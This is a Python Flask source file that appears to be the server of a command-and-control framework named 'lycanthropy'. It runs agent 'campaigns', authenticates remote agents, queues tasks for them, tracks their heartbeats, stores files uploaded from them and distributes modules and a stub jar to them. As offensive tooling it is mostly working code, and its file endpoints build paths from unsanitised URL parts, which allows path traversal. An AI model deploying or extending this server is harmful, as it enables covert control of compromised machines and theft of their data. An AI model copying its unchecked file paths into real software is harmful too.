import threading

from flask import Flask, request, jsonify, make_response, abort, send_from_directory
import lycanthropy.handler.gatekeeper
import lycanthropy.auth.login
import lycanthropy.auth.cookie
import lycanthropy.auth.client
import lycanthropy.sql.broker
import lycanthropy.sql.interface
import lycanthropy.portal.api
import lycanthropy.portal.categorize
import lycanthropy.portal.agent
import lycanthropy.dist.inventory
import lycanthropy.dist.builder
import argparse
import base64
import requests
import binascii
import json
import jwt
import time
import os
import uuid
import sys
import inspect
from datetime import datetime

app = Flask(__name__)
lycanthropy.sql.broker.dbSetup()

class lycanthrope():
    def __init__(self):
        #MAKE SURE TO GET RID OF TEST VALUES IN THE END
        self.api = {
            'springroll':{}
        }
        self.frontendConfig = json.load(open('../etc/daemon.json', 'r'))
        self.keys = {}
        self.dist = {}
        self.monitors = {}
        self.sessions = []
        self.ephemeral = []
        self.pulse = {}
        self.port = ''
        self.interface = ''
        self.monitoring = {
            #use receiveMonitoring to store data here
            'data':{
                'privileged':False,
                'events':[]
            },
            'auth':{
                'privileged':True,
                'events': []
            },
            'portal':{
                'privileged':False,
                'events': []
            },
            'daemon':{
                'privileged':False,
                'events': []
            }
        }
        self.config = json.load(
            open(
                '../etc/app.json',
                'r'
            )
        )

        self.provisionerMap = {
            'auth':self.authStreamProvisioner,
            'data':self.dataStreamProvisioner,
            'portal':self.portalStreamProvisioner,
            'daemon':self.daemonStreamProvisioner
        }
        for table in lycanthropy.sql.server.getTables():
            if table not in ['access','metadata','build']:
                self.api[table] = {}


    def parseCmdLine(self):
        #prototype for independent launch
        parser = argparse.ArgumentParser()
        parser.add_argument("--interface",help="0.0.0.0 or 127.0.0.1",default="0.0.0.0")
        parser.add_argument("--SSLKeyFile",help="path to SSLKeyFile (empty to use default, requires SSLCertFile as well)",default="../etc/lupus.key")
        parser.add_argument("--SSLCertFile",help="path to SSLCertFile (empty to use default, requires SSLCertFile as well)",default="../etc/lupus.crt")
        return parser.parse_args()

    def checkLocalPost(self,request):
        #prevent remote access to parts of the api
        if request.remote_addr != "127.0.0.1":
            abort(403)
        else:
            #if local, check for ephemeral id
            if '_eaid' in request.cookies:
                if request.cookies.get('_eaid') not in self.ephemeral:
                    abort(401)
            else:
                abort(401)

    def dataStreamProvisioner(self,event,token):
        #jwt structure :
        # - expiry
        # - streamid
        # - sha256 hash of event data
        # - acid
        #uses the daemon secret
        tokenData = jwt.decode(
            token,
            self.frontendConfig['secret'],
            algorithms=["HS256"]
        )
        acid = event['acid']
#        if event['class'] != 'metadata':
#            event.pop('acid')

        if int(time.time()) <= tokenData['_expiry']:
            if tokenData['_stream'] == 'data':
                #if tokenData['_hash'] == lycanthropy.portal.api.getHash(str(event)):
                if tokenData['_acid'] == acid:
                    return True
        return False


    def portalStreamProvisioner(self,event,token):
        #jwt structure :
        # - expiry
        # - streamid
        # - sha256 of event data
        # - sha256 of ssl key
        #make a jwt token for the event & the portal
        tokenData = jwt.decode(
            token,
            self.frontendConfig['secret'],
            algorithms=["HS256"]
        )
        if int(time.time()) <= tokenData['_expiry']:
            if tokenData['_stream'] == 'portal':
                return True
        return False

    def daemonStreamProvisioner(self,event,token):
        #jwt structure :
        # - expirty
        # - streamid
        # - sha256 of event data
        #make a jwt token for the event & the daemon
        pass

    def authStreamProvisioner(self,event,token):
        #jwt structure :
        # - expiry
        # - streamid
        # - sha256 of event data
        # - user
        #make a jwt for the event & the remote host (pass through to the receiveMonitoring function)
        pass

    def threadedOperationHandler(self,targetVariable,targetFunction,arguments,key):
        output = targetFunction(*arguments)
        if targetVariable in self.__dict__:
            self.__dict__[targetVariable][key] = output
        print(json.dumps({'alert':'threaded operation complete'},indent=4))

    def mkPortalEvent(self,acid,remote,apiData,campaignMembership):
        monToken = lycanthropy.daemon.util.mkToken(apiData,acid,self.frontendConfig['secret'],'portal')
        apiCookie = lycanthropy.auth.cookie.apify(monToken, remote, str(apiData))
        self.ephemeral.append(apiCookie)
        connector = {
            'apiCookie': apiCookie,
            'port': self.port,
            'interface': self.interface
        }
        lycanthropy.portal.api.pushPortalEvent(
            apiData,
            monToken,
            connector,
            campaignMembership
        )

@app.errorhandler(400)
def badRequest(e):
    return make_response(jsonify({'error':'bad request'}),400)

@app.errorhandler(401)
def accessError(e):
    return make_response(jsonify({'error':'unauthorized'}),401)

@app.errorhandler(403)
def accessDenied(e):
    return make_response(jsonify({'error':'forbidden'}),403)



@app.route('/lycanthropy/ui-handler/auth',methods=['POST'])
def authenticatorMain():
    #lytty auth function

    loginData = {}
    user = ""
    try:
        user = request.args.get('lycan')
        loginData = request.json

    except:
        abort(400)
    if lycanthropy.auth.client.verifyAuth(user,loginData['password']):
        remote = request.remote_addr
        lysessid = lycanthropy.auth.client.apiToken(user,lycan.config,remote)
        lycan.sessions.append(lysessid)
        acidQuery = lycanthropy.sql.interface.filterAgents({})
        for acidMeta in acidQuery:
            apiData = {"alert":"ACID {} is inactive".format(acidMeta['acid']),'acid':acidMeta['acid'],"timestamp":datetime.now().strftime("%m/%d/%Y - %H:%M:%S")}
            campaignMembership = lycanthropy.portal.categorize.find(acidMeta['acid'])
            lycan.mkPortalEvent(acidMeta['acid'],request.remote_addr,apiData,campaignMembership)
        return lysessid
    else:
        abort(401)


@app.route('/lycanthropy/<campaign>/fileStore/<file>',methods=['POST','GET'])
def fileMain(campaign,file):
    wdIdentity = None
    if 'LYSESSID' in request.cookies and 'APIUSER' in request.cookies:
        token = request.cookies.get('LYSESSID')
        apiUser = base64.b64decode(request.cookies.get('APIUSER')).decode('utf-8')
        remote = request.remote_addr
        if token in lycan.sessions:
            if lycanthropy.auth.client.verifyToken(apiUser,lycan.config,token,remote) == False:
                abort(401)
        else:
            abort(401)
    else:
        abort(400)

    if request.method == 'POST':

        if request.json != None:
            uploadData = request.json
            fileData = base64.b64decode(uploadData['fileData'])
            fileObj = open('campaign/{}/docroot/{}'.format(campaign,file),'wb')
            fileObj.write(fileData)
            fileObj.close()
            return make_response(jsonify({'success':'completed write operation for {}'.format(file)}),200)
        else:
            abort(400)
    else:
        fileHandle = open('campaign/{}/warehouse/{}'.format(campaign,file),'rb')
        fileObj = make_response(jsonify({'path':file,'data':base64.b64encode(fileHandle.read()).decode('utf-8')}),200)
        return fileObj




@app.route('/lycanthropy/ui-handler/<context>/<directive>',methods=['POST'])
def cmdMain(context,directive):
    #receives commands from lytty
    if 'LYSESSID' in request.cookies and 'APIUSER' in request.cookies:
        token = request.cookies.get('LYSESSID')
        apiUser = base64.b64decode(request.cookies.get('APIUSER')).decode('utf-8')
        remote = request.remote_addr
        if token in lycan.sessions:
            if lycanthropy.auth.client.verifyToken(apiUser,lycan.config,token,remote) == False:
                abort(401)
        else:
            abort(401)
    else:
        abort(400)
    apiCookie = lycanthropy.auth.cookie.apify(token,remote,directive)
    #apiCookie is an ephemeral token

    lycan.ephemeral.append(apiCookie)
    #add the eaid to the ephemeral cookie set

    #create a connector to let the gatekeeper talk back to the api
    connector = {
        'apiCookie':apiCookie,
        'port':lycan.port,
        'interface':lycan.interface,
        'apiToken':lycanthropy.auth.client.decodeToken(token,lycan.config),
        'tokenRaw':token
    }

    cmdArgs = request.json
    if cmdArgs != None:
        cmdOut = lycanthropy.handler.gatekeeper.interpret(directive, cmdArgs, context, connector)
        return make_response(jsonify(cmdOut),200)
    else:
        abort(400)

@app.route('/lycanthropy/data-handler/tokenizer',methods=['POST'])
def authenticatorSecondary():
    #wolfmon auth function
    loginData = {}
    user = ""
    try:
        user = request.args.get('lycan')
        loginData = request.json

    except:
        abort(400)
    if lycanthropy.auth.client.verifyAuth(user, loginData['password']):
        #instantiate a new wolfmon session
        identity = loginData['wolfmon']
        remote = request.remote_addr
        lycan.monitors[identity] = lycanthropy.portal.api.subscribeMonitor(user, lycan.config, remote, identity)
        return lycan.monitors[identity]['token']
    else:
        abort(401)


@app.route('/lycanthropy/data-handler/0',methods=['POST'])
def retrieveMonitoring():
    #get monitoring for wolfmon
    lycanthropy.portal.api.updateAgentStates(lycan.pulse)

    try:
        subscription = request.json
    except:
        abort(400)
    if 'LYSESSID' in request.cookies and 'APIUSER' in request.cookies and '_wdmID' in request.cookies:
        token = request.cookies.get('LYSESSID')
        apiUser = base64.b64decode(request.cookies.get('APIUSER')).decode('utf-8')
        wdIdentity = base64.b64decode(request.cookies.get('_wdmID')).decode('utf-8')

        if wdIdentity in lycan.monitors:
            if lycan.monitors[wdIdentity]['token'] != token:
                abort(401)
            else:
                subscriptionReceiver = []
                canaryStamp = int(time.time())
                while True:
                    resultCount = 0
                    for subFilter in subscription['subscriptions']:
                        match = lycanthropy.portal.api.returnMonitoringStream(
                            lycan.monitoring[subFilter['stream']]['events'],
                            lycan.monitors[wdIdentity],
                            wdIdentity,
                            subFilter)

                        if match['state'] == 'true':
                            mtcIdx = lycan.monitoring[match['stream']]['events'].index(match['output'])

                            subscriptionReceiver.append(match)
                            resultCount += 1


                            lycan.monitoring[match['stream']]['events'][mtcIdx]['tags'].append(wdIdentity)
                            if len(lycan.monitoring[match['stream']]['events'][mtcIdx]['tags']) == len(lycan.monitors):
                                lycan.monitoring[match['stream']]['events'].pop(mtcIdx)

                    if resultCount > 0:
                        return make_response(jsonify(subscriptionReceiver),200)
                    if int(time.time()) >= canaryStamp+15:
                        return make_response(jsonify([{'output':{'tags':[]}}]),200)

        else:
            abort(401)


@app.route('/lycanthropy/data-handler/1/<streamID>',methods=['POST'])
def receiveMonitoring(streamID):
    #store monitoring for wolfmon
    lycan.checkLocalPost(request)
    if request.json != None and '_lmt' in request.cookies:
        eventData = request.json
        streamProvisioner = lycan.provisionerMap[streamID]
        
        if streamProvisioner(eventData,request.cookies['_lmt']):
            eventData['tags'] = []
            if eventData not in lycan.monitoring[streamID]['events']:
                lycan.monitoring[streamID]['events'].append(eventData)
            return {'status':'200'},200
        else:
            abort(403)
    else:
        abort(400)

@app.route('/lycanthropy/data-handler/2',methods=['GET'])
def manageMonitoring():
    #get objects to construct campaign monitoring with
    if 'LYSESSID' in request.cookies and 'APIUSER' in request.cookies and '_wdmID' in request.cookies:
        objType = request.args.get('__SOBJTYPE')
        token = request.cookies.get('LYSESSID')
        apiUser = base64.b64decode(request.cookies.get('APIUSER')).decode('utf-8')
        wdIdentity = base64.b64decode(request.cookies.get('_wdmID')).decode('utf-8')

        if wdIdentity in lycan.monitors:
            if lycan.monitors[wdIdentity]['token'] != token:
                abort(401)
            else:
                #verify campaign access
                subset = lycanthropy.portal.api.getSubscriptionObjects(
                    apiUser,
                    lycan.config,
                    token,
                    request.remote_addr,
                    wdIdentity,
                    objType
                )
                if subset == 'error':
                    abort(400)
                else:
                    return subset
        else:
            abort(403)
    else:
        abort(400)


@app.route('/lycanthropy/api/<acid>',methods=['POST','GET'])
def apiMain(acid):
    #add more verification
    if request.method == 'POST':
        lycan.checkLocalPost(request)
        if request.json != None:
            try:
                campaign = lycanthropy.portal.categorize.find(acid)
                if campaign in os.listdir('campaign') and campaign not in lycan.api:
                    lycan.api[campaign] = {}
            except:
                return {'error':'could not retrieve data for acid, check your syntax'}
            taskDef = request.json
            if acid not in lycan.api[campaign]:
                lycan.api[campaign][acid] = []
            lycan.api[campaign][acid].append(taskDef)
            return taskDef
        else:
            return {'error':'task definition is null'}
    else:
        abort(400)


@app.route('/0/0/<acid>',methods=['POST'])
def portalData(acid):
    #data ingestion
    try:
        apiData = request.json
        monToken = request.cookies.get('_lmt')
    except:
        return {'error':'invalid dataflow'}

    remote = request.remote_addr
    apiCookie = lycanthropy.auth.cookie.apify(monToken, remote, str(apiData))
    lycan.ephemeral.append(apiCookie)
    connector = {
        'apiCookie': apiCookie,
        'port': lycan.port,
        'interface': lycan.interface
    }
    apiData['acid'] = acid
    campaignMembership = lycanthropy.portal.categorize.find(acid)
    if 'jobID' in apiData:
        if 'ROTID' in apiData['jobID']:

            apiDataQ = {"alert":"ACID {} has completed setup and is ready to accept directives".format(acid),'acid':acid,"timestamp":datetime.now().strftime("%m/%d/%Y - %H:%M:%S")}
            lycan.mkPortalEvent(acid,request.remote_addr,apiDataQ,campaignMembership)

        for agentTask in lycan.api[campaignMembership][acid]:
            if apiData['jobID'] == agentTask['jobID']:
                popIndex = lycan.api[campaignMembership][acid].index(agentTask)
                lycan.api[campaignMembership][acid].pop(popIndex)

    dbStore = lycanthropy.portal.api.data(campaignMembership,apiData)
    if json.loads(dbStore)['streamStatus'] == 'complete' and apiData not in lycan.monitoring['data']['events']:
        lycanthropy.portal.api.pushDataEvent(apiData,monToken,connector,campaignMembership)
    return dbStore


@app.route('/0/1/<acid>/<ctrlKey>',methods=['GET'])
def portalApi(ctrlKey,acid):
    #api endpoint
    if lycanthropy.portal.agent.verify(acid, ctrlKey, 'ctrlKey'):
        try:
            campaignMembership = lycanthropy.portal.categorize.find(acid)
        except:
            abort(403)

        try:
            nexti = lycan.api[campaignMembership][acid][0]
            apiData = {"alert":"ACID {} attempting to pull JobID {}".format(acid,nexti["jobID"]),'acid':acid,"timestamp":datetime.now().strftime("%m/%d/%Y - %H:%M:%S")}
            lycan.mkPortalEvent(acid,request.remote_addr,apiData,campaignMembership)

            if 'attempts' not in nexti:
                lycan.api[campaignMembership][acid][0]['attempts'] = 1
            else:
                if nexti['attempts'] == 3:
                    lycan.api[campaignMembership][acid].pop(0)
                    nexti = {'error':'task was not found'}
                else:
                    lycan.api[campaignMembership][acid][0]['attempts'] += 1
        except Exception as e:
            print(e)
            print('error, task not found')
            nexti = {'error':'task was not found'}
        return nexti
    else:
        abort(401)


#acid stands for agent control identifier
@app.route('/1/0/<acid>',methods=['POST'])
def authMain(acid):
    #authentication endpoint

    try:
        authData = request.json

    except:
        return {'error':'invalid auth request'}

    if lycanthropy.auth.login.verify(authData):
        acidActual = lycanthropy.portal.categorize.findTemp(acid)
        campaignMembership = lycanthropy.portal.categorize.find(acidActual)
        apiData = {"alert":"ACID {} has successfully authenticated".format(acidActual),'acid':acidActual,'timestamp':datetime.now().strftime("%m/%d/%Y - %H:%M:%S")}
        lycan.mkPortalEvent(acid,request.remote_addr,apiData,campaignMembership)

        return {
            'cookieDough':lycanthropy.auth.cookie.generate(
                authData['password'],authData['acid']
            ),
            'refStamp':str(int(time.time())),
            'key':base64.b64encode((lycanthropy.sql.interface.filterBuild({'tempAcid':authData['acid']})[0]['confKey']).encode('utf-8')).decode('utf-8')
        }
    else:
        abort(403)


@app.route('/2/0/<acid>/<descriptor>',methods=['GET'])
def distMain(acid,descriptor):
    #package distribution backend
    distKey = request.args['_key'].replace(' ','+')
    fileType = request.args['_rtype']
    if lycanthropy.portal.agent.verify(acid,distKey,'distKey'):
        #I would put file upload here but it's probably better to have a separate handler for each control method instead
        campaignMembership = lycanthropy.portal.categorize.find(acid)

        byteKey = lycanthropy.portal.agent.derive(acid, 'distKey')

        if fileType == 'load':
            #pkg pull
            byteKey = lycanthropy.portal.agent.derive(acid,'distKey')
            pkgData = lycan.dist[byteKey]
            try:
                pkgData = lycan.dist[byteKey]
                if 'errorCode' not in pkgData:
                    return pkgData
                else:
                    print(json.dumps({'error':'hit exception attempting to retrieve package for dist load operation'},indent=4))
                    abort(400)
            except:
                print(json.dumps({'error':'hit exception attempting to retrieve package for dist load operation'},indent=4))
                abort(400)
        elif fileType == 'pull':
            #download function
            #filters by campaign

            #fileData = lycanthropy.dist.inventory.fileSearch(acid,descriptor)
            byteKey = lycanthropy.portal.agent.derive(acid, 'distKey')
            try:
                fileData = lycan.dist[byteKey]
                if 'errorCode' not in fileData:
                    return fileData
                else:
                    print(json.dumps({'error':'hit exception attempting to retrieve file for dist pull operation'},indent=4))
                    abort(400)
            except:
                print(json.dumps({'error':'hit exception attempting to retrieve file for dist pull operation'},indent=4))
                abort(400)
        else:
            if fileType == 'pull.queue':
                apiData = {"alert":"ACID {} attempting to retrieve file {} via dist".format(acid,descriptor),'acid':acid,'timestamp':datetime.now().strftime("%m/%d/%Y - %H:%M:%S")}
                retrThread = threading.Thread(target=lycan.threadedOperationHandler,args=('dist',lycanthropy.dist.inventory.fileSearch,[acid,descriptor],byteKey,))
            elif fileType == 'load.queue':
                apiData = {"alert":"ACID {} attempting to retrieve module UUID {} via dist".format(acid,descriptor),'acid':acid,'timestamp':datetime.now().strftime("%m/%d/%Y - %H:%M:%S")}
                retrThread = threading.Thread(target=lycan.threadedOperationHandler,args=('dist', lycanthropy.dist.inventory.pkgSearch,[acid,descriptor],byteKey,))
            else:
                abort(400)
            lycan.mkPortalEvent(acid,request.remote_addr,apiData,campaignMembership)

            retrThread.start()
            return {'dist':'ok'}

    else:
        abort(401)

@app.route('/3/0/<acid>',methods=['GET'])
def pacemakerMain(acid):
    #pulse / heartbeat function
    campaignMembership = lycanthropy.portal.categorize.find(acid)
    if campaignMembership != False:
        directiveActual = []
        acidObj = lycan.api[campaignMembership][acid]
        for jobItem in acidObj:
            #if lycanthropy.portal.api.chkSatisfied(jobItem,acid):
            #    jobIdx = lycan.api[campaignMembership][acid].index(jobItem)
            #    lycan.api[campaignMembership][acid].pop(jobIdx)
            #else:
            directiveActual.append(jobItem)
        lycan.pulse[acid] = int(time.time())
        lycanthropy.portal.api.updateAgentStates(lycan.pulse)
        return {
            'directives':str(len(directiveActual))
        }
    else:
        return {'error':'agent is not a member of an active campaign'}

@app.route('/4/0/<confKey>/<acid>', methods=['GET'])
def portalConf(confKey, acid):
    #configuration backend
    decodedKey = base64.b64decode(confKey).decode('utf-8')
    status = lycanthropy.portal.api.config(decodedKey,acid)
    if status['error'] == False:
        campaign = status['config']['campaign']
        identifier = status['config']['acid']
        if campaign not in lycan.api:
            lycan.api[campaign] = {}
        if identifier not in lycan.api[campaign]:
            lycan.api[campaign][identifier] = []
        lycan.api[campaign][identifier].append(
            lycanthropy.portal.api.taskMetadata(status['config'])
        )
        return status['config']
    else:
        abort(400)

@app.route('/5/0/<buildID>/<buildKey>/lycanthropy.jar',methods=['GET'])
def portalBuild(buildID,buildKey):
    #build retrieval backend
    decodedKey = base64.b64decode(buildKey.replace(' ', '+')).decode('utf-8')
    decodedID = base64.b64decode(buildID.replace(' ', '+')).decode('utf-8')
    if 'buildID' in request.args and request.args['buildID'] != 'null':
        buildTarget = request.args['buildID']
        buildPath = lycanthropy.dist.builder.retrieveBuilds(decodedKey,decodedID,buildTarget)
        if type(buildPath) != dict:
            #teardownThread = threading.Thread(target=lycanthropy.dist.builder.destroyBuild,args=(buildPath,))
            #teardownThread.run()
            return send_from_directory(buildPath,'buildstub-0.1.jar')
        else:
            return buildPath
    else:
        buildApi = lycanthropy.dist.builder.listBuilds(decodedKey,decodedID)
        return buildApi


if __name__=='__main__':
    global lycan
    lycan = lycanthrope()
    args = lycan.parseCmdLine()
    lycan.interface = args.interface
    lycan.port = 56114
    agentData = lycanthropy.sql.interface.filterAgents({})
    for metaObj in agentData:
        lycanthropy.sql.server.updateStatus(
            metaObj['acid'],
            'inactive'
        )
    acidQuery = lycanthropy.sql.interface.filterAgents({})
    for acidMeta in acidQuery:
        lycan.pulse[acidMeta['acid']] = int(time.time()-3000)

    try:
        app.run(host=args.interface,port=56114,ssl_context=(args.SSLCertFile,args.SSLKeyFile),use_reloader=False)
    except KeyboardInterrupt:
        print('caught portal shutdown, exiting...')
        sys.exit(0)
